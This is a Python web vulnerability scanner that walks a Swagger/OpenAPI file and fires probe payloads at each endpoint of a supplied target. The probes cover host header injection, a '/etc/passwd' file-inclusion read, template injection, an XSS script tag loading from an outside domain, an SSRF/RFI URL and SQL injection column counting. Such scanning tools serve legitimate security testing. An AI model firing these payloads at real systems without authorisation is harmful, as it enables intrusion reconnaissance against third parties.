import yaml
import requests
import urllib3
import urllib.parse
import argparse

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants for terminal colors
GREEN = "\033[92m"
RESET = "\033[0m"

def hhi(url, method, headers, postdata):
    headers['Host'] = urllib.parse.urlparse(url).netloc + ':csalab.id'
    
    response = requests.request(method, url, headers=headers, json=postdata, verify=False)
    if 'csalab.id' in response.text:
        print(f"[{GREEN}VULN{RESET}] URL: {url}\n       Bug: Host Header Injection")

def lfi(url, headers, postdata, bugdata):
    for data in bugdata:
        postdata[data] = '/etc/passwd'
        response = requests.post(url, headers=headers, json=postdata, verify=False)
        if 'root:x:0:0:root' in response.text:
            print(f"[{GREEN}VULN{RESET}] URL: {url}\n       Data: {data}\n       Bug: Local File Inclusion (LFI)")

def ssti(url, headers, postdata, bugdata):
    for data in bugdata:
        postdata[data] = '{{678*789}}'
        response = requests.post(url, headers=headers, json=postdata, verify=False)
        if '534942' in response.text:
            print(f"[{GREEN}VULN{RESET}] URL: {url}\n       Data: {data}\n       Bug: Server-Side Template Injection (SSTI)")

def xss(url, headers, postdata, bugdata):
    for data in bugdata:
        postdata[data] = '<script src=//csaf.app>'
        response = requests.post(url, headers=headers, json=postdata, verify=False)
        if '<script src=//csaf.app>' in response.text:
            print(f"[{GREEN}VULN{RESET}] URL: {url}\n       Data: {data}\n       Bug: Cross Site Scripting (XSS)")

def ssrf(url, headers, postdata, bugdata):
    for data in bugdata:
        postdata[data] = 'http://rfi.csaf.me/bug/py'
        response = requests.post(url, headers=headers, json=postdata, verify=False)
        if 'Remote File Inclusion' in response.text:
            print(f"[{GREEN}VULN{RESET}] URL: {url}\n       Data: {data}\n       Bug: Server-Side Request Forgery (SSRF)")

def sqli(url, headers, postdata, bugdata):
    for data in bugdata:
        for i in range(1, 10):
            postdata[data] = f"test' order by {i} -- -"
            response = requests.post(url, headers=headers, json=postdata, verify=False)
            if 'order by term out of range' in response.text.lower():
                print(f"[{GREEN}VULN{RESET}] URL: {url}\n       Data: {data}\n       Table: {i-1}\n       Bug: SQL Injection (SQLI)")
                postdata[data] = "test"
                break

def check_vuln(url, method, headers, postdata, bugdata):
    hhi(url, method, headers, postdata)
    if method == "POST":
        lfi(url, headers, postdata, bugdata)
        ssti(url, headers, postdata, bugdata)
        xss(url, headers, postdata, bugdata)
        ssrf(url, headers, postdata, bugdata)
        sqli(url, headers, postdata, bugdata)

def parse_swagger(yaml_file, baseurl):
    with open(yaml_file, 'r') as file:
        swagger_data = yaml.safe_load(file)

    baseapi = swagger_data.get('servers', [])[0].get('url', '')

    for path, methods in swagger_data.get('paths', {}).items():
        for method, details in methods.items():
            fullurl = baseurl + baseapi + path
            headers = {'Accept': '*/*'}
            postdata = {}
            print(f"[SCAN] URL: {fullurl}")

            if 'requestBody' in details:
                content = details['requestBody'].get('content', {})
                for content_type, content_details in content.items():
                    headers['Content-Type'] = content_type
                    schema = content_details.get('schema', {})
                    bug = schema.get('x-body-name')
                    if bug:
                        bug_data = swagger_data.get('components', {}).get('schemas', {}).get(bug, {}).get('required', [])
                        for data in bug_data:
                            postdata[data] = 'test'
                        check_vuln(fullurl, method.upper(), headers, postdata, bug_data)
            else:
                check_vuln(fullurl, method.upper(), headers, postdata, {})

def main():
    print("""
     ____                                   __     ______  
    / ___|_      ____ _  __ _  __ _  ___ _ _\ \   / / ___| 
    \___ \ \ /\ / / _` |/ _` |/ _` |/ _ \ '__\ \ / /\___ \ 
     ___) \ V  V / (_| | (_| | (_| |  __/ |   \ V /  ___) |
    |____/ \_/\_/ \__,_|\__, |\__, |\___|_|    \_/  |____/ 
                        |___/ |___/                        
    """)
    print("Swagger Vulnerability Scanner\n")
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--file', type=str, default='swagger.yml', help='Swagger file')
    parser.add_argument('target', help='URL to test')
    args = parser.parse_args()
    
    parse_swagger(args.file, args.target)

if __name__ == "__main__":
    main()
